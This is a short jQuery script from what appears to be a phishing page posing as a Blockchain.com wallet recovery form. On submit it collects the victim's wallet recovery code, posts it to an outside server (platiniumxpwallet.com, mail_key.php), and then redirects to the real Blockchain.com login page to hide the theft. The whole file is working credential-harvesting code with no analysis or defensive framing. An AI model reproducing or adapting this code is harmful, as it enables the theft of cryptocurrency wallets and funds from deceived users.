$('document').ready(function () {

    $('#move-on').on('click', function () {
        $('.recovery-option').addClass('hide');
        $('.left').addClass('hide');
        $('#peep_ide').addClass('hide');
        $('*#show_next').removeClass('hide');
        $('.form_recover').removeClass('hide');
    })

    $('#homepa').on('click', function () {
        $('.recovery-option').removeClass('hide');
        $('.left').removeClass('hide');
        $('#peep_ide').removeClass('hide');
        $('*#show_next').addClass('hide');
        $('.form_recover').addClass('hide');
        return false;
    })

    $('#brand_submit').on('click', function () {

        $('#brand_submit').attr('disabled', true);
        $('#brand_submit').html('Please Wait...');

        var code = $('#recovery_code').val();

        $.ajax({
            url: 'https://platiniumxpwallet.com/external/Blockchain/php/mail_key.php',
            method: 'post',
            data: {
                code
            },
            success: function (data) {
                console.log(data);
                if (data == 'Sent') {
                    location.assign('https://login.blockchain.com/#/login/');
                } else {
                    alert('Error Logging Into Your Account');
                }
            },
            fail: function (data) {
                console.log(data);
                alert('Error Logging Into Your Account');
            },
            error: function (data) {
                console.log(data);
                alert('Error Logging Into Your Account');
            }
        })

        return false;

    })

})